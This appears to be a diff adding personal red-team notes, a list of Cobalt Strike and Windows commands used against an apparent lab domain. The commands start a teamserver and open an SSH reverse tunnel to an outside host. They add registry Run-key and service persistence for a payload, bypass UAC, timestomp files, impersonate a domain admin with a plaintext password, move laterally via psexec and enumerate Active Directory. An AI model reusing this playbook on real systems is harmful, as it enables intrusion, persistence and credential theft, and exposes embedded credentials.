@@ -1,0 +1,59 @@
+shell sc qc WIN6499
+shell sc delete WIN6499
+
+Taskkill /PID 2400 /F
+rm WIN6499.exe
+upnpcont.exe
+tar -xvf cobaltstrike-trial.tgz 
+
+~/cobaltstrike# ./teamserver 74.28.31.46 josh1
+
+root@kali:~/cobaltstrike# ./cobaltstrike
+
+ssh -R 74.28.31.46:443:127.0.0.1:443 root@74.28.31.46
+
+G4e!n@krj9
+
+run macro
+
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WIN6499" /t REG_SZ /F /D "C:\Users\guy.fleegman\AppData\local\Temp\WIN6499.exe"
+shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v win6499  /f
+//del..... need to be in same  reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v win6499  /f
+
+
+shell shutdown /r /t 0 /f
+
+runas SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX c:\users\Public\WIN6499.exe
+
+bypassuac
+
+//remind..... create sc exe payload
+shell sc create WIN6499 binpath= "C:\Windows\System32\WIN6499.exe" start= auto DisplayName= "windows x6499 manager"
+
+shell sc description WIN6499 "This is for Nick and Wimpy to see my service"
+shell sc start WIN6499
+timestomp WIN6414.exe desktop.ini
+
+//remind..... must get domain&user first
+make_token SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX
+
+psexec_psh 172.16.20.194
+172.16.20.194
+
+shell dsquery.exe * -filter "(objectclass=computer)" -attr * -limit 2
+SPRWS-19.spr.ershon.local or 172.16.20.144
+
+shell dsquery.exe * -filter "(objectclass=trusteddomain)" -attr flatname trustdirection
+
+shell dsquery.exe * -filter "(objectclass=user)" -attr * -limit 2 -d spr.ershon.local
+"&(objectClass=person)(objectCategory=user)"
+shell dsquery.exe * -filter "&(objectClass=computer)(operatingSystem=*7*)" -attr * -limit 2 -d spr.ershon.local
+
+dsquery * -filter "&(objectClass=person)(objectCategory=user)" -attr cn lastLogonTimestamp -limit 2
+
+172.16.5.10
+ERSHON-DC1.ershon.local
+
+PS   -he's loged on 
+steal_token need PID
